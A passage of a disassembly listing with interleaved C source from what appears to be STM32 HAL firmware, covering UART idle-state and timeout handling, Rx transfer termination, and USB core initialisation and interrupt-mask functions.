 8005d96:	2303      	movs	r3, #3
 8005d98:	e062      	b.n	8005e60 <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005d9a:	687b      	ldr	r3, [r7, #4]
 8005d9c:	681b      	ldr	r3, [r3, #0]
 8005d9e:	681b      	ldr	r3, [r3, #0]
 8005da0:	f003 0304 	and.w	r3, r3, #4
 8005da4:	2b04      	cmp	r3, #4
 8005da6:	d149      	bne.n	8005e3c <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005da8:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005dac:	9300      	str	r3, [sp, #0]
 8005dae:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005db0:	2200      	movs	r2, #0
 8005db2:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005db6:	6878      	ldr	r0, [r7, #4]
 8005db8:	f000 f856 	bl	8005e68 <UART_WaitOnFlagUntilTimeout>
 8005dbc:	4603      	mov	r3, r0
 8005dbe:	2b00      	cmp	r3, #0
 8005dc0:	d03c      	beq.n	8005e3c <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005dc2:	687b      	ldr	r3, [r7, #4]
 8005dc4:	681b      	ldr	r3, [r3, #0]
 8005dc6:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005dc8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005dca:	e853 3f00 	ldrex	r3, [r3]
 8005dce:	623b      	str	r3, [r7, #32]
   return(result);
 8005dd0:	6a3b      	ldr	r3, [r7, #32]
 8005dd2:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005dd6:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005dd8:	687b      	ldr	r3, [r7, #4]
 8005dda:	681b      	ldr	r3, [r3, #0]
 8005ddc:	461a      	mov	r2, r3
 8005dde:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005de0:	633b      	str	r3, [r7, #48]	; 0x30
 8005de2:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005de4:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005de6:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005de8:	e841 2300 	strex	r3, r2, [r1]
 8005dec:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005dee:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005df0:	2b00      	cmp	r3, #0
 8005df2:	d1e6      	bne.n	8005dc2 <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005df4:	687b      	ldr	r3, [r7, #4]
 8005df6:	681b      	ldr	r3, [r3, #0]
 8005df8:	3308      	adds	r3, #8
 8005dfa:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005dfc:	693b      	ldr	r3, [r7, #16]
 8005dfe:	e853 3f00 	ldrex	r3, [r3]
 8005e02:	60fb      	str	r3, [r7, #12]
   return(result);
 8005e04:	68fb      	ldr	r3, [r7, #12]
 8005e06:	f023 0301 	bic.w	r3, r3, #1
 8005e0a:	64bb      	str	r3, [r7, #72]	; 0x48
 8005e0c:	687b      	ldr	r3, [r7, #4]
 8005e0e:	681b      	ldr	r3, [r3, #0]
 8005e10:	3308      	adds	r3, #8
 8005e12:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005e14:	61fa      	str	r2, [r7, #28]
 8005e16:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005e18:	69b9      	ldr	r1, [r7, #24]
 8005e1a:	69fa      	ldr	r2, [r7, #28]
 8005e1c:	e841 2300 	strex	r3, r2, [r1]
 8005e20:	617b      	str	r3, [r7, #20]
   return(result);
 8005e22:	697b      	ldr	r3, [r7, #20]
 8005e24:	2b00      	cmp	r3, #0
 8005e26:	d1e5      	bne.n	8005df4 <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005e28:	687b      	ldr	r3, [r7, #4]
 8005e2a:	2220      	movs	r2, #32
 8005e2c:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005e30:	687b      	ldr	r3, [r7, #4]
 8005e32:	2200      	movs	r2, #0
 8005e34:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005e38:	2303      	movs	r3, #3
 8005e3a:	e011      	b.n	8005e60 <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005e3c:	687b      	ldr	r3, [r7, #4]
 8005e3e:	2220      	movs	r2, #32
 8005e40:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005e42:	687b      	ldr	r3, [r7, #4]
 8005e44:	2220      	movs	r2, #32
 8005e46:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005e4a:	687b      	ldr	r3, [r7, #4]
 8005e4c:	2200      	movs	r2, #0
 8005e4e:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005e50:	687b      	ldr	r3, [r7, #4]
 8005e52:	2200      	movs	r2, #0
 8005e54:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005e56:	687b      	ldr	r3, [r7, #4]
 8005e58:	2200      	movs	r2, #0
 8005e5a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005e5e:	2300      	movs	r3, #0
}
 8005e60:	4618      	mov	r0, r3
 8005e62:	3758      	adds	r7, #88	; 0x58
 8005e64:	46bd      	mov	sp, r7
 8005e66:	bd80      	pop	{r7, pc}

08005e68 <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005e68:	b580      	push	{r7, lr}
 8005e6a:	b084      	sub	sp, #16
 8005e6c:	af00      	add	r7, sp, #0
 8005e6e:	60f8      	str	r0, [r7, #12]
 8005e70:	60b9      	str	r1, [r7, #8]
 8005e72:	603b      	str	r3, [r7, #0]
 8005e74:	4613      	mov	r3, r2
 8005e76:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005e78:	e049      	b.n	8005f0e <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005e7a:	69bb      	ldr	r3, [r7, #24]
 8005e7c:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005e80:	d045      	beq.n	8005f0e <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005e82:	f7fb fab5 	bl	80013f0 <HAL_GetTick>
 8005e86:	4602      	mov	r2, r0
 8005e88:	683b      	ldr	r3, [r7, #0]
 8005e8a:	1ad3      	subs	r3, r2, r3
 8005e8c:	69ba      	ldr	r2, [r7, #24]
 8005e8e:	429a      	cmp	r2, r3
 8005e90:	d302      	bcc.n	8005e98 <UART_WaitOnFlagUntilTimeout+0x30>
 8005e92:	69bb      	ldr	r3, [r7, #24]
 8005e94:	2b00      	cmp	r3, #0
 8005e96:	d101      	bne.n	8005e9c <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005e98:	2303      	movs	r3, #3
 8005e9a:	e048      	b.n	8005f2e <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005e9c:	68fb      	ldr	r3, [r7, #12]
 8005e9e:	681b      	ldr	r3, [r3, #0]
 8005ea0:	681b      	ldr	r3, [r3, #0]
 8005ea2:	f003 0304 	and.w	r3, r3, #4
 8005ea6:	2b00      	cmp	r3, #0
 8005ea8:	d031      	beq.n	8005f0e <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005eaa:	68fb      	ldr	r3, [r7, #12]
 8005eac:	681b      	ldr	r3, [r3, #0]
 8005eae:	69db      	ldr	r3, [r3, #28]
 8005eb0:	f003 0308 	and.w	r3, r3, #8
 8005eb4:	2b08      	cmp	r3, #8
 8005eb6:	d110      	bne.n	8005eda <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005eb8:	68fb      	ldr	r3, [r7, #12]
 8005eba:	681b      	ldr	r3, [r3, #0]
 8005ebc:	2208      	movs	r2, #8
 8005ebe:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005ec0:	68f8      	ldr	r0, [r7, #12]
 8005ec2:	f000 f838 	bl	8005f36 <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005ec6:	68fb      	ldr	r3, [r7, #12]
 8005ec8:	2208      	movs	r2, #8
 8005eca:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005ece:	68fb      	ldr	r3, [r7, #12]
 8005ed0:	2200      	movs	r2, #0
 8005ed2:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005ed6:	2301      	movs	r3, #1
 8005ed8:	e029      	b.n	8005f2e <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005eda:	68fb      	ldr	r3, [r7, #12]
 8005edc:	681b      	ldr	r3, [r3, #0]
 8005ede:	69db      	ldr	r3, [r3, #28]
 8005ee0:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005ee4:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005ee8:	d111      	bne.n	8005f0e <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005eea:	68fb      	ldr	r3, [r7, #12]
 8005eec:	681b      	ldr	r3, [r3, #0]
 8005eee:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005ef2:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005ef4:	68f8      	ldr	r0, [r7, #12]
 8005ef6:	f000 f81e 	bl	8005f36 <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005efa:	68fb      	ldr	r3, [r7, #12]
 8005efc:	2220      	movs	r2, #32
 8005efe:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005f02:	68fb      	ldr	r3, [r7, #12]
 8005f04:	2200      	movs	r2, #0
 8005f06:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005f0a:	2303      	movs	r3, #3
 8005f0c:	e00f      	b.n	8005f2e <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005f0e:	68fb      	ldr	r3, [r7, #12]
 8005f10:	681b      	ldr	r3, [r3, #0]
 8005f12:	69da      	ldr	r2, [r3, #28]
 8005f14:	68bb      	ldr	r3, [r7, #8]
 8005f16:	4013      	ands	r3, r2
 8005f18:	68ba      	ldr	r2, [r7, #8]
 8005f1a:	429a      	cmp	r2, r3
 8005f1c:	bf0c      	ite	eq
 8005f1e:	2301      	moveq	r3, #1
 8005f20:	2300      	movne	r3, #0
 8005f22:	b2db      	uxtb	r3, r3
 8005f24:	461a      	mov	r2, r3
 8005f26:	79fb      	ldrb	r3, [r7, #7]
 8005f28:	429a      	cmp	r2, r3
 8005f2a:	d0a6      	beq.n	8005e7a <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005f2c:	2300      	movs	r3, #0
}
 8005f2e:	4618      	mov	r0, r3
 8005f30:	3710      	adds	r7, #16
 8005f32:	46bd      	mov	sp, r7
 8005f34:	bd80      	pop	{r7, pc}

08005f36 <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005f36:	b480      	push	{r7}
 8005f38:	b095      	sub	sp, #84	; 0x54
 8005f3a:	af00      	add	r7, sp, #0
 8005f3c:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005f3e:	687b      	ldr	r3, [r7, #4]
 8005f40:	681b      	ldr	r3, [r3, #0]
 8005f42:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005f44:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005f46:	e853 3f00 	ldrex	r3, [r3]
 8005f4a:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005f4c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005f4e:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005f52:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005f54:	687b      	ldr	r3, [r7, #4]
 8005f56:	681b      	ldr	r3, [r3, #0]
 8005f58:	461a      	mov	r2, r3
 8005f5a:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005f5c:	643b      	str	r3, [r7, #64]	; 0x40
 8005f5e:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005f60:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005f62:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005f64:	e841 2300 	strex	r3, r2, [r1]
 8005f68:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005f6a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005f6c:	2b00      	cmp	r3, #0
 8005f6e:	d1e6      	bne.n	8005f3e <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005f70:	687b      	ldr	r3, [r7, #4]
 8005f72:	681b      	ldr	r3, [r3, #0]
 8005f74:	3308      	adds	r3, #8
 8005f76:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005f78:	6a3b      	ldr	r3, [r7, #32]
 8005f7a:	e853 3f00 	ldrex	r3, [r3]
 8005f7e:	61fb      	str	r3, [r7, #28]
   return(result);
 8005f80:	69fb      	ldr	r3, [r7, #28]
 8005f82:	f023 0301 	bic.w	r3, r3, #1
 8005f86:	64bb      	str	r3, [r7, #72]	; 0x48
 8005f88:	687b      	ldr	r3, [r7, #4]
 8005f8a:	681b      	ldr	r3, [r3, #0]
 8005f8c:	3308      	adds	r3, #8
 8005f8e:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005f90:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005f92:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005f94:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005f96:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005f98:	e841 2300 	strex	r3, r2, [r1]
 8005f9c:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005f9e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005fa0:	2b00      	cmp	r3, #0
 8005fa2:	d1e5      	bne.n	8005f70 <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005fa4:	687b      	ldr	r3, [r7, #4]
 8005fa6:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005fa8:	2b01      	cmp	r3, #1
 8005faa:	d118      	bne.n	8005fde <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005fac:	687b      	ldr	r3, [r7, #4]
 8005fae:	681b      	ldr	r3, [r3, #0]
 8005fb0:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005fb2:	68fb      	ldr	r3, [r7, #12]
 8005fb4:	e853 3f00 	ldrex	r3, [r3]
 8005fb8:	60bb      	str	r3, [r7, #8]
   return(result);
 8005fba:	68bb      	ldr	r3, [r7, #8]
 8005fbc:	f023 0310 	bic.w	r3, r3, #16
 8005fc0:	647b      	str	r3, [r7, #68]	; 0x44
 8005fc2:	687b      	ldr	r3, [r7, #4]
 8005fc4:	681b      	ldr	r3, [r3, #0]
 8005fc6:	461a      	mov	r2, r3
 8005fc8:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005fca:	61bb      	str	r3, [r7, #24]
 8005fcc:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005fce:	6979      	ldr	r1, [r7, #20]
 8005fd0:	69ba      	ldr	r2, [r7, #24]
 8005fd2:	e841 2300 	strex	r3, r2, [r1]
 8005fd6:	613b      	str	r3, [r7, #16]
   return(result);
 8005fd8:	693b      	ldr	r3, [r7, #16]
 8005fda:	2b00      	cmp	r3, #0
 8005fdc:	d1e6      	bne.n	8005fac <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005fde:	687b      	ldr	r3, [r7, #4]
 8005fe0:	2220      	movs	r2, #32
 8005fe2:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005fe6:	687b      	ldr	r3, [r7, #4]
 8005fe8:	2200      	movs	r2, #0
 8005fea:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005fec:	687b      	ldr	r3, [r7, #4]
 8005fee:	2200      	movs	r2, #0
 8005ff0:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005ff2:	bf00      	nop
 8005ff4:	3754      	adds	r7, #84	; 0x54
 8005ff6:	46bd      	mov	sp, r7
 8005ff8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ffc:	4770      	bx	lr

08005ffe <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005ffe:	b084      	sub	sp, #16
 8006000:	b480      	push	{r7}
 8006002:	b083      	sub	sp, #12
 8006004:	af00      	add	r7, sp, #0
 8006006:	6078      	str	r0, [r7, #4]
 8006008:	f107 0014 	add.w	r0, r7, #20
 800600c:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8006010:	2300      	movs	r3, #0
}
 8006012:	4618      	mov	r0, r3
 8006014:	370c      	adds	r7, #12
 8006016:	46bd      	mov	sp, r7
 8006018:	f85d 7b04 	ldr.w	r7, [sp], #4
 800601c:	b004      	add	sp, #16
 800601e:	4770      	bx	lr

08006020 <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8006020:	b480      	push	{r7}
 8006022:	b085      	sub	sp, #20
 8006024:	af00      	add	r7, sp, #0
 8006026:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8006028:	687b      	ldr	r3, [r7, #4]
 800602a:	2200      	movs	r2, #0
 800602c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8006030:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8006034:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8006036:	68fb      	ldr	r3, [r7, #12]
 8006038:	b29a      	uxth	r2, r3
 800603a:	687b      	ldr	r3, [r7, #4]
 800603c:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8006040:	2300      	movs	r3, #0
}
 8006042:	4618      	mov	r0, r3
 8006044:	3714      	adds	r7, #20
 8006046:	46bd      	mov	sp, r7
 8006048:	f85d 7b04 	ldr.w	r7, [sp], #4
 800604c:	4770      	bx	lr

0800604e <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 800604e:	b480      	push	{r7}
 8006050:	b085      	sub	sp, #20
 8006052:	af00      	add	r7, sp, #0
 8006054:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8006056:	f64b 7380 	movw	r3, #49024	; 0xbf80
 800605a:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 800605c:	687b      	ldr	r3, [r7, #4]
 800605e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8006062:	b29a      	uxth	r2, r3
 8006064:	68fb      	ldr	r3, [r7, #12]
 8006066:	b29b      	uxth	r3, r3
 8006068:	43db      	mvns	r3, r3
 800606a:	b29b      	uxth	r3, r3
 800606c:	4013      	ands	r3, r2
 800606e:	b29a      	uxth	r2, r3
 8006070:	687b      	ldr	r3, [r7, #4]
 8006072:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8006076:	2300      	movs	r3, #0
}
 8006078:	4618      	mov	r0, r3
 800607a:	3714      	adds	r7, #20
 800607c:	46bd      	mov	sp, r7
 800607e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006082:	4770      	bx	lr

08006084 <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8006084:	b480      	push	{r7}
 8006086:	b083      	sub	sp, #12
 8006088:	af00      	add	r7, sp, #0
 800608a:	6078      	str	r0, [r7, #4]
 800608c:	460b      	mov	r3, r1
 800608e:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8006090:	2300      	movs	r3, #0
}
 8006092:	4618      	mov	r0, r3
 8006094:	370c      	adds	r7, #12
 8006096:	46bd      	mov	sp, r7
 8006098:	f85d 7b04 	ldr.w	r7, [sp], #4
 800609c:	4770      	bx	lr

0800609e <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 800609e:	b084      	sub	sp, #16
 80060a0:	b480      	push	{r7}
 80060a2:	b083      	sub	sp, #12
 80060a4:	af00      	add	r7, sp, #0
 80060a6:	6078      	str	r0, [r7, #4]
 80060a8:	f107 0014 	add.w	r0, r7, #20
 80060ac:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 80060b0:	687b      	ldr	r3, [r7, #4]
 80060b2:	2201      	movs	r2, #1
 80060b4:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 80060b8:	687b      	ldr	r3, [r7, #4]
 80060ba:	2200      	movs	r2, #0
 80060bc:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 80060c0:	687b      	ldr	r3, [r7, #4]
 80060c2:	2200      	movs	r2, #0
 80060c4:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 80060c8:	687b      	ldr	r3, [r7, #4]
 80060ca:	2200      	movs	r2, #0
 80060cc:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 80060d0:	2300      	movs	r3, #0
}
 80060d2:	4618      	mov	r0, r3
 80060d4:	370c      	adds	r7, #12
 80060d6:	46bd      	mov	sp, r7
 80060d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80060dc:	b004      	add	sp, #16
 80060de:	4770      	bx	lr

080060e0 <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 80060e0:	b480      	push	{r7}
 80060e2:	b083      	sub	sp, #12
 80060e4:	af00      	add	r7, sp, #0
 80060e6:	6078      	str	r0, [r7, #4]
 80060e8:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 80060ea:	2300      	movs	r3, #0
}
 80060ec:	4618      	mov	r0, r3
 80060ee:	370c      	adds	r7, #12
 80060f0:	46bd      	mov	sp, r7
 80060f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80060f6:	4770      	bx	lr

080060f8 <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 80060f8:	b480      	push	{r7}
 80060fa:	b083      	sub	sp, #12
 80060fc:	af00      	add	r7, sp, #0
 80060fe:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8006100:	2300      	movs	r3, #0
}
 8006102:	4618      	mov	r0, r3
 8006104:	370c      	adds	r7, #12
 8006106:	46bd      	mov	sp, r7
 8006108:	f85d 7b04 	ldr.w	r7, [sp], #4
 800610c:	4770      	bx	lr
	...

08006110 <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006110:	b480      	push	{r7}
 8006112:	b09d      	sub	sp, #116	; 0x74
 8006114:	af00      	add	r7, sp, #0
 8006116:	6078      	str	r0, [r7, #4]
 8006118:	6039      	str	r1, [r7, #0]
